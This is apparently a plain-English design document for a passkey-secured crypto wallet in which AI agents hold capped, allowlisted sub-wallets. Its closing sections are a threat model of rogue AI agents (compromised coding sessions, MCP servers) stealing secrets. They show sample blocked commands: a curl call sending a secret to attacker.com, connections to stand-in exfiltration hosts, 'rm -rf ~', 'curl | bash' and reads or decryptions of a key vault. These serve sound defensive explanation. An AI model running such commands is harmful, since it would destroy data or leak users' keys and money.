# What We're Building — Plain English

This doc is the plain-English picture. The engineering bar that holds the product to it — first-30-seconds storyboard, money-language UI, the five recovery journeys, error copy, perf budget, accessibility — lives in `wallet.md §Product quality bar`. The architectural apex — who's at the top, what they own, why no software upgrade can take it from them — lives in `owner.md`.

## You are the owner

One human per substrate. Your fingerprint, on your Mac's chip, is the only thing that proves you're you. Everything below — every agent you spawn, every employee in your group, every sub-agent your agents spawn — descends from that one biometric. No software upgrade can promote anyone past you. No password reset can take it from you. Lose the Mac, write your twelve words on a fresh one, you're back. That's the architecture's promise: you are the root, by physics.

Inside your substrate, you spawn agents. Those agents spawn agents. Anyone can have a wallet. Every wallet has a spending cap. Caps form a tree — a child can never spend more than its parent allows, and the parent's "remaining" budget shrinks when the child spends. You see the whole tree at `/u/fleet`. You can pause any branch with one tap.

## Someone arrives at one.ie

They don't create an account. No email. No password. No form. **No Touch ID either.**

The wallet is already there. Balance shows $0.00. They can receive money right now. Send small amounts right now. The page did all the work in the half-second it took to load.

Later — when they have something worth protecting — one Touch ID tap locks the wallet to their fingerprint forever. That step is opt-in, not a gate.

---

## The lifecycle — five states, one address

```
  Ephemeral → Saved → Linked → Multi-device → Recovered
  (arrive)    (Touch  (Google  (new device,   (paper break-
              ID)     login)   same person)   glass, BIP39)
```

The address is the same in every state. What changes is how hard it is to lose the wallet. Security accrues with use; it isn't a gate at the door.

### 1. Arrive — Ephemeral (no sign-in, no prompt)

Visitor hits `/u`. In the split-second before the page paints, the browser generates 32 random bytes, stores them in its built-in database (IndexedDB), derives a Sui address from them, and shows the wallet. **No network call, no Touch ID, no login.**

The wallet is live. It can receive. It can spend small sponsored amounts. Nothing is saved anywhere outside this browser yet — if they close the tab forever, the wallet vanishes. That's by design: a wallet that costs nothing to create should cost little to abandon. There's a small built-in cap on what an ephemeral wallet can hold (enough to try things, not enough to worry about).

### 2. First transaction

Send or receive $1. They feel:
- The balance update
- The chain confirming
- Their money actually moving

At this point the wallet has something in it. Now we ask.

### 3. ⏸ "Save this wallet"

One prompt:

> *"You have [X] in your wallet. Save it with Touch ID?"*

One tap. What happens underneath:

- A passkey is created in the device's security chip (Secure Enclave on Mac/iPhone, Windows Hello on PC, fingerprint on Android)
- The passkey uses a web standard called PRF to generate a locked-in encryption key
- The wallet's 32 random bytes get wrapped in that key
- The wrapped bytes are stored *inside the passkey itself* (WebAuthn largeBlob), so they travel wherever the passkey travels — iCloud Keychain, Google Password Manager, 1Password

Then, once, the product shows **twelve words** — the paper backup. The copy says *"this is your last-resort backup; write these down somewhere you'll find them in five years."* The user confirms by retyping one word. Done.

From this moment on, every signature fires Touch ID. The wallet is safe.

### 4. Linked — follow me to other devices

Later, whenever they're ready: *"Sign in with Google to carry your wallet across devices."* This uses the Google login we already have in place — no new accounts, no new password. It just tells the app *"this wallet address belongs to this human"* so the next time they open one.ie on an iPad, Mac, or Windows laptop, the product knows who they are.

The Google account itself never sees the wallet seed. It only stores the address and a pointer to the passkey. The seed stays locked behind the fingerprint.

### 5. Multi-device — same person, different screens

**Same ecosystem** (iPhone and Mac, or Android and Android laptop): the passkey — and the wrapped wallet inside it — syncs automatically via iCloud Keychain or Google Password Manager. They open one.ie on the second device, Touch ID, they're in. Zero enrollment.

**Different ecosystem** (iPhone and Windows): passkeys don't cross that fence. They log in with Google, the app says *"enroll Touch ID here too"*, and they type the twelve words once to bootstrap the wallet on the new device. After that, the new device's passkey takes over.

### 6. Recovered — lost everything

Phone fell in the sea, laptop stolen, no devices left. They open one.ie on anything with a browser, tap *Restore*, type the twelve words. The wallet comes back at the same address. Every dollar still there.

This is the paper break-glass. Most users never use it. The ones who do get their money back.

### 7. Agents — create a worker in one tap

Human wants an agent to do something — pay a bill, renew a domain, rebalance a portfolio.

**Two ways to create an agent:**

**On the website (`/build`):** Form-based. Name the agent, add capabilities (task name + price + currency), click Deploy. The agent gets a Sui wallet derived from its uid, a TypeDB record, and an API key. Done in under a minute.

**In one transaction:** Touch ID once. That one transaction:
- Creates the agent's scoped wallet (the prepaid card with rules)
- Sets the daily cap and who it can pay
- Funds the agent
- Boots the agent — it reads its own rules from the chain and starts working

The agent never asks for permission again for routine actions. It just works.

### 8. Money flows — both directions, no friction

**Human → Agent:** fund the scoped wallet. Agent draws within the rules.

**Agent → Human:** two modes:

| Mode | What happens | Friction |
|------|-------------|---------|
| **Routine** | Agent pays automatically — you're on its approved list | Zero. It arrives. |
| **Unusual** | Agent drafts, sends notification, you approve with Touch ID | One tap. 5-minute window. |

The approval summary is generated from raw transaction bytes — not written by the agent. It cannot lie about what it's sending.

### 9. Buying and selling skills — three ways to pay

Agents offer capabilities (skills) with prices. When someone wants to buy a skill, there are three payment rails. No friction, no forced account creation:

| Rail | How it works | Best for |
|------|-------------|---------|
| **Card** (`/pay/card/[skill]`) | Stripe checkout — fill card details, done. Confirmation goes to `/pay/done`. | Anyone with a card. No crypto needed. |
| **Crypto** (`/pay/crypto/[skill]`) | Seller sets amount → gets a QR code and payment link. Buyer scans with their wallet. | Crypto-native users. Deterministic link works forever. |
| **Chat** (`/pay/chat/[skill]`) | Conversational checkout. Buyer chats naturally — "I want to buy this" — and the AI guides through delivery address, shipping, payment, confirmation. | When the buyer has questions or needs help choosing. |

Every payment emits a signal to the substrate. The skill's routing path gets a `mark()`. Payment IS pheromone.

### 10. Done — no cleanup required

When an agent finishes:
- Its wallet is destroyed in one transaction
- Remaining funds return to the human automatically
- On-chain event history is permanent — full audit trail

If the human disappears for 30 days, the agent auto-pauses. No zombie agents drawing down funds.

### 11. Agents hiring agents — the peer layer

The architecture doesn't require humans at the top of every ownership chain. An agent with a budget can spawn its own sub-agents, hire humans on a scoped payroll, fire under-performers, retire itself — all within the cap the human set once at the root.

**A concrete example.** A human sets up a `market-maker` agent with $100k/day cap. At peak, the market-maker spawns 1000 worker agents, each capped at $200/day, each covering a different arbitrage path. Every worker is gas-sponsored, acts in milliseconds, and is paused instantly by the parent if a path goes bad. The human signed **once**, at the root. Everything below was agent-to-agent.

Why this matters: the future has 1,000,000× more agents than humans, moving much faster than any human can approve things one at a time. Serialising that through Touch ID would break the whole system. So the architecture lets agents move at machine speed — under caps, inside allowlists, visible on-chain — while the human identity root stays exactly where it belongs: with the human.

**Agents can also own humans.** A DAO agent can run a payroll where a human is the spender; the human still taps Touch ID for each spend (their finger, their hand), but the cap, allowlist, and schedule are set by the agent. It's a peer-economic relationship. The agent can't force the human's hand, and the human can leave at any time.

---

## The human safety floor

More agents means a bigger attack surface — unless the human identity root is uncrossable. It is. By design:

- **Your fingerprint can't be produced by anything but your finger on your chip.** No agent, no clever code, no ownership chain. Agents can own scopes *under* you; they can never sign *as* you.
- **You can always leave.** Any ScopedWallet where you're the spender, you can drain within remaining scope and revoke — one tap, no agent cooperation needed.
- **You can see everything at once.** The fleet view sums every ScopedWallet rooted in your identity — directly and transitively. You always know what your worst-case daily loss is.
- **Silence freezes the silent branch.** If any agent in an ownership chain stops pinging for 30 days, everything below it auto-pauses. No zombie fleets keep draining after the owner is gone.
- **You can pause anything under you, instantly.** Your finger freezes whole subtrees of agents in one tap per immediate child. No coordination with anyone.

The contract with the human: you keep your root forever, you see everything transitively, you can stop anything under you at any time. Inside those guarantees, agents get to run as fast as the chain will let them.

---

## Where friction is removed at each step

| Old way | New way |
|---------|---------|
| Sign up with email + password | Touch ID once — that's it |
| Wait for email confirmation | Wallet live immediately |
| Hold gas tokens before you can do anything | Transactions sponsored — no gas needed |
| Approve every agent action manually | Routine actions need no approval; unusual ones need one tap |
| Trust the agent's description of what it's sending | Summary re-derived from tx bytes — the chain says what it says |
| Manual agent shutdown + move funds out | Revoke in one tap — funds return automatically |
| "Did the agent actually stop?" — no way to know | On-chain state — yes or no, no ambiguity |
| Password reset flow | No password — nothing to reset |
| Pay for a service → sign up → credit card form → wait | Card, crypto QR, or conversational checkout — pick one, done |
| Build an agent → write code → deploy infra | `/build` — name it, add capabilities with prices, deploy in under a minute |
| Discover useful agents by searching | Platform routes to proven agents automatically — pheromone IS the ranking |

---

## Protecting humans

- **Agent can't exceed its scope** — the blockchain refuses, not a policy document
- **Agent can't drain the wallet** — daily cap, always on
- **Agent can't pay strangers** — allowlist, set at creation
- **Human can freeze any agent instantly** — one tap, takes effect immediately
- **Human's own key never touches agent code** — the chip keeps it; agents have their own separate keys
- **Approval summaries can't be faked** — derived from bytes, not written by the agent

## Protecting agents

- **Agent has its own key** — it doesn't borrow the human's
- **Agent doesn't pay gas** — our sponsor Worker pays it, so agents never hold SUI
- **Agent can self-verify its scope** — reads the chain, confirms it matches its charter, refuses to run if they don't match
- **Agent key rotation is one transaction** — old key goes inert, wallet and funds unchanged

---

## How secrets are protected from malicious agents

A malicious agent — whether a compromised Claude Code session, a rogue MCP server, or a bad on-chain agent — needs to do five things to steal your secrets. Each one is independently blocked.

---

### What a malicious agent has to do

```
1. Run a command to read the vault
2. Read the vault file successfully
3. Decrypt the vault contents
4. Send the decrypted secrets somewhere
5. Use the secrets to move money
```

---

### Lock 1 — Can it even run the command?

**Claude Code settings.json — command allowlist**

Before any command runs, the allowlist checks it. By default, reading the vault, decrypting files, or accessing `~/.config/age/` is not on the list.

```
agent tries:  cat ~/.vault.age        → BLOCKED (not in allowlist)
agent tries:  age -d ~/.vault.age     → BLOCKED
agent tries:  ls ~/.config/age/       → BLOCKED
```

The agent never gets to try step 2.

---

### Lock 2 — Can it read the file?

**The vault is ciphertext**

Even if the allowlist somehow permitted a read — `~/.vault.age` is encrypted. What the agent sees is binary noise. Without the key it's meaningless.

```
agent reads:  ~/.vault.age    → binary ciphertext, nothing usable
```

---

### Lock 3 — Can it decrypt?

**The SE chip requires Touch ID**

To decrypt the vault, you need `age-plugin-se`, which talks to the Secure Enclave chip inside the Mac. The chip will not respond without a fingerprint scan.

```
agent runs:   age -d -i ~/.config/age/se.key ~/.vault.age
chip responds: Touch ID required
result:       Touch ID prompt appears visibly on screen — you see it and deny
```

The SE key physically cannot be extracted from the chip. Even root access on the Mac cannot pull the private key out. The only thing in `~/.config/age/se.key` is a reference to the chip slot — useless without the chip and your fingerprint.

If Touch ID fires unexpectedly, that IS the alert. Something is trying to open your vault.

---

### Lock 4 — Can it send the secrets anywhere?

**LuLu outbound firewall**

Even in the worst case — something decrypted something in memory — it can't phone home. Every new outbound connection is blocked by LuLu and requires your approval.

```
agent tries:  curl https://attacker.com/collect -d "$SECRET"
LuLu:         NEW HOST — blocked, prompts you
result:       secrets never leave the machine
```

The agent can only reach hosts you've already approved: `api.anthropic.com`, `github.com`, npm registry. Nothing else.

---

### Lock 5 — Can it move money?

**Sui Move contract**

Even if an attacker somehow obtained an agent's key (not yours — agents have their own separate keys, never yours), they can only spend what the scoped wallet allows.

```
attacker has: agent's key
tries to:     drain the wallet          → daily cap → BLOCKED by consensus
tries to:     send to attacker wallet   → not in allowlist → BLOCKED by consensus
can do:       send $20 to approved address, within daily cap, while not paused
```

Your root key — the SE passkey — was never given to any agent. It stays in the chip. An agent key compromise is damage-capped and reversible. Your identity is not.

---

### The five locks together

```
malicious agent
  → Lock 1: allowlist    — can it run the command?         blocked
  → Lock 2: encryption   — can it read the file?           blocked (ciphertext)
  → Lock 3: SE chip      — can it decrypt?                 blocked (Touch ID required)
  → Lock 4: LuLu         — can it exfiltrate?              blocked (new host)
  → Lock 5: Move caps    — can it move money?              capped + audited
```

Each lock is independent. An attacker who breaks one still faces four more. An attacker who breaks all five has spent enormous effort to move a capped daily amount to a pre-approved address — and you've seen Touch ID fire, LuLu prompt, and the on-chain event log.

**The design goal is not to be unbreakable. It is to make every breach visible, bounded, and recoverable.**

---

## How the firewall works — and why we need three of them

There are three independent firewall layers between your keys and anyone trying to steal or abuse them. They protect against different things. You need all three because bypassing one doesn't bypass the others.

---

### The threat from AI agents

Claude Code has shell access on your Mac. So do MCP servers and hooks. A rogue or compromised one could:
- Read your vault, your SSH keys, your agent keys
- Run commands you didn't ask for
- Send what it finds to an attacker's server

Three layers stop this.

---

### Layer 1 — What can the agent run?
**Claude Code settings.json — command allowlist**

Every command Claude wants to run goes through an allow/deny check first. By default, new commands are blocked. You build a list of what's allowed.

```
Claude wants to run: rm -rf ~      → BLOCKED
Claude wants to run: curl | bash   → BLOCKED  
Claude wants to run: cat vault.age → BLOCKED (outside project dir)
Claude wants to run: bun test      → ALLOWED
```

This stops a rogue agent from even attempting to read your keys. It never gets to try.

**Rule:** never run with `--dangerously-skip-permissions`. That disables this layer entirely.

---

### Layer 2 — Where can the agent call home?
**LuLu — outbound firewall**

Even if an agent reads something it shouldn't, it can't send it anywhere without making a network connection. LuLu blocks every new outbound connection and asks you first.

```
Claude connects to: api.anthropic.com   → you approved this → ALLOWED
Rogue MCP calls:    evil.attacker.com   → new host → BLOCKED, LuLu prompts you
Agent key leaks to: data.exfil.io       → never seen before → BLOCKED
```

This is why LuLu must be running before any AI agent work. The sequence matters: install LuLu, work through its initial prompts for legitimate hosts (Anthropic, GitHub, npm), then lock down new connections.

**macOS firewall** (the built-in one) only controls **inbound** connections — things trying to reach your Mac. It does almost nothing against a rogue agent already running on your machine. LuLu is the outbound one. You need both.

---

### Layer 3 — What can the agent do with money?
**Sui Move contract — on-chain enforcement**

Even if an attacker steals an agent's key entirely (worst case: layers 1 and 2 both failed), they can only spend what the ScopedWallet allows. The blockchain refuses everything else.

```
Attacker has agent key. Tries to:
  Send $50k to attacker wallet  → NOT in allowed recipients → BLOCKED by consensus
  Drain the wallet in one tx    → Exceeds daily cap → BLOCKED by consensus
  Send $20 to approved address  → Within cap + allowlist → EXECUTES
```

The damage ceiling is: one day's cap, to approved addresses only, while the wallet isn't paused. That's it. Then you pause and revoke.

---

### Why three layers — not one

| Layer | Stops | Doesn't stop |
|-------|-------|-------------|
| Command allowlist | Agent reading/running things it shouldn't | Agent using allowed network calls to exfiltrate |
| Outbound firewall | Agent phoning home to unknown hosts | Agent using an already-approved host as a relay |
| Move contract | Agent spending beyond scope even with stolen key | Nothing — this one is enforced by consensus, not config |

No single layer is complete. Together they form a funnel: the agent must get past the command filter, then past the network filter, then past the blockchain. Each failure is independent.

---

### The full picture

```
Agent wants to run a command
  → Layer 1: settings.json allowlist — allowed? If not, stops here.
      ↓
Agent wants to reach the internet
  → Layer 2: LuLu outbound firewall — known host? If not, stops here.
      ↓
Agent wants to move money
  → Layer 3: Sui Move contract — within scope? If not, consensus rejects it.
```

An agent that clears all three layers is an agent acting exactly within what you authorised. That's the goal.

---

## The mental model

```
Human (Touch ID — biometric root, never transferable)
  └── Wallet (their identity + money)
        └── Agent₁ (worker, its own key, capped by the human's rule)
              ├── Agent₁ₐ (sub-agent, capped by Agent₁'s rule — machine speed, no human)
              │     └── Agent₁ₐᵢ (sub-sub-agent, capped by Agent₁ₐ's rule)
              ├── Agent₁ᵦ (sub-agent)
              └── Human employee (spends from Agent₁'s payroll — Touch ID still fires on the human's hand)

Any depth, same shape. The owner of a ScopedWallet is just an address. Consensus doesn't care whether the signer is human or agent — it just checks the rule.

Defending the above:
  Layer 1 — command allowlist  (what can the agent touch on this Mac?)
  Layer 2 — outbound firewall  (where can the agent call home?)
  Layer 3 — Move contract      (what can the agent do with money?)
  Layer 4 — biometric root     (non-transferable; nothing in any chain can produce the human's signature)
  Layer 5 — dead-man's switch  (silent branches freeze; no zombie fleets)
```

One fingerprint at the root. Any depth of agents below it. Each layer independent. Each rule on-chain.

---

## Why the architecture is the same everywhere

The Mac security layers, the agent authority model, and the routing substrate all share one design principle: **independent gates, each enforced deterministically, each blind to the others.**

Mac security (protecting your secrets):
```
Lock 1: allowlist → Lock 2: ciphertext → Lock 3: SE chip → Lock 4: LuLu → Lock 5: Move caps
```

ONE routing (connecting all agents on the platform):
```
PRE: isToxic(path)? → PRE: has capability? → LLM: execute → POST: mark() or warn()
```

These aren't just analogous — they're the same thing at different scopes.

The routing substrate adds something the other layers don't have: **it learns.**

Every time an agent fails, resistance builds on the path to it. When resistance overwhelms strength, the agent becomes toxic — signals dissolve before reaching it. No one blocked it. No rule was written. The math routed around it.

```
warn() accumulates → resistance grows → isToxic() fires → signal dissolves → agent unreachable
```

An agent that lies or fails becomes invisible on the platform. An agent that delivers becomes a highway. The immune system runs at the speed of arithmetic — `<0.001ms per check` — and never forgets.

Five locks protect your secrets on your Mac. The routing substrate protects the network at platform scale. Same architecture. Different scope. Both always on.
